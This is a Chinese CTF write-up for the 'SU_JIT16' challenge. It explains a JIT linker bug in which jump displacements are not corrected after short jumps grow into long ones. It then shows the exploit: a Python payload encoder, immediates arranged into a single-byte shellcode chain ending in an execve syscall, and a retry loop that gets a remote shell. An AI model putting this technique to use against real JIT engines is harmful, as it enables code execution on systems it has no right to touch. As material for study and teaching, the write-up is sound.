# SU_JIT16

## 题目简述

题目实现了一台 16 位 RISC 风格虚拟机，并把用户提交的虚拟机指令即时编译为 x86-64 机器码。程序先在 RW 映射中生成代码，链接跳转后再改成 RX 并执行，最后读取 `rax` 作为虚拟机返回值。

每条输入指令占 32 位，小端序下的字段如下：

```text
bits  0..3   : opcode
bits  4..7   : opkind
bits  8..11  : src
bits 12..15  : dst
bits 16..31  : signed imm16
```

虚拟机只暴露 `ax`、`bx`、`cx`、`dx` 四个寄存器，内存写功能也受到限制。预期漏洞并不在某条算术指令，而在 JIT 链接器对短跳和长跳的地址重算不完整：前面的跳转可能按旧布局链接，最终落到另一条生成指令的中间，形成可控的 x86 指令流。

## 解题过程

JIT 入口代码先保存数据段指针，然后清空大部分寄存器：

```asm
mov r8, rdi
xor rax, rax
xor rbx, rbx
xor rcx, rcx
xor rdx, rdx
xor rdi, rdi
xor rsi, rsi
; 其余通用寄存器也被清零
```

退出代码只有一条 `ret`。`rsp` 和 `rbp` 不会被虚拟机指令直接操作，所以正常生成的代码可以安全返回主程序。

虚拟机的 `jmp` 和 `jeq` 在预编译阶段先被当成两字节短跳：

```asm
eb 00
```

链接阶段若发现偏移不在 $[-128,127]$，才把它改成五字节长跳：

```asm
e9 xx xx xx xx
```

单条跳转这样处理没有问题；问题在于链接器按顺序工作，计算当前跳转目标时仍使用预编译阶段记录的后续指令地址。假设前面的跳转 A 跨过跳转 B，而 B 后来由两字节膨胀成五字节，A 已写入的位移不会随之增加三字节。最终 A 会落到原目标前方三字节处：

```text
A: jmp C
   ...
B: jmp D      <- 链接时由 2 字节变为 5 字节
   ...
C: generated code
```

这个三字节误差可以让控制流进入生成指令的立即数。虚拟机指令 `mov ax, imm16` 对应：

```text
66 b8 xx yy
```

连续生成多条后，字节布局为：

```text
66 b8 xx yy 66 b8 aa bb 66 b8 ...
```

把每个立即数布置为 `single_byte_opcode || 0x84`，并让错误跳转从 `xx` 开始执行，就会得到：

```text
xx | 84 66 b8 | aa | 84 66 b8 | ...
```

其中 `xx`、`aa` 等是攻击者选择的单字节指令，而 `84 66 b8` 会被解码为一条三字节的 `test` 类指令，只修改标志位，不破坏主要寄存器。这样每四字节生成块都能稳定贡献一条单字节 shellcode 指令。

exp 的虚拟机编码器可以简化为：

```python
def pack_code(opkind, opcode, dst, src, imm):
    if imm < 0:
        imm += 0x10000
    value = (
        opcode
        | (opkind << 4)
        | (src << 8)
        | (dst << 12)
        | (imm << 16)
    )
    return p32(value)

def mri(dst, imm):
    return pack_code(0, 1, dst, 0, imm)

def jmp(off):
    return pack_code(5, 0, 0, 0, off)
```

触发跳转尺寸变化后，把单字节指令逐个塞入 `mov ax, imm16`：

```python
payload = jmp(4) + jmp(100) + jmp(100)
payload += b"".join(
    mri(0, u16(p8(op) + b"\x84"))
    for op in shellcode_bytes
)
payload += mri(0, u16(b"\x0f\x05"))
```

受限指令流还有两个关键约束：

1. 每个有效指令之间都夹着 `84 66 b8`，其寻址要求 `rsi` 指向可读地址；
2. 虚拟机的数据段只读，不能直接在那里写入 `/bin/sh\0`。

程序通过 `call` 进入 JIT 代码，因此第一条单字节指令可以使用 `pop rsi`，把栈顶返回地址取到 `rsi`，满足后续填充指令的可读寻址要求。之后用 `push`/`pop` 在寄存器之间传值，并利用字符串指令：

```asm
movsb
movsd
stosb
lodsb
std
cld
```

让 `rsi`、`rdi` 在可写栈区中移动。通过重复拷贝和地址低字节加减，逐字节构造 `/bin/sh\0`，再准备：

```text
rdi -> "/bin/sh\0"
rsi -> 栈上一个值为 NULL 的指针数组
rdx = 0
rax = 59
```

最后一个 `mov ax, 0x050f` 在错误入口下会执行 `0f 05`，即 `syscall`，完成 `execve`。官方 exp 中用于构造字符串的栈地址低字节存在 $1/16$ 的随机性，所以脚本会在连接失败时重试：

```python
while True:
    io = remote(host, port)
    io.send(payload)
    try:
        io.sendline(b"cat flag")
        result = io.recvuntil(b"}", timeout=1)
        break
    except EOFError:
        io.close()
```

远程服务使用动态 flag，成功取得 shell 后执行 `cat flag` 即可得到本次实例的 flag。

## 方法总结

本题的利用原语是“JIT 链接布局变化后，旧跳转位移未被修正”，而不是虚拟机本身直接提供任意写。分析类似目标时，需要分别记录虚拟指令索引、预编译地址、最终机器码长度和链接顺序；只检查单条跳转是否合法，会漏掉跨越其他可变长跳转时的整体布局错误。

受限 shellcode 的构造也依赖真实解码边界。这里不是简单把两字节立即数当机器码，而是让一个单字节有效指令与固定的三字节无害指令交替执行。利用脚本最后保留了概率重试，这不是网络不稳定，而是栈地址低字节参与字符串构造所造成的明确概率条件；若要消除重试，可进一步多次利用错误跳转，在正常虚拟机指令和单字节指令流之间切换，直接设置所需寄存器和字节。
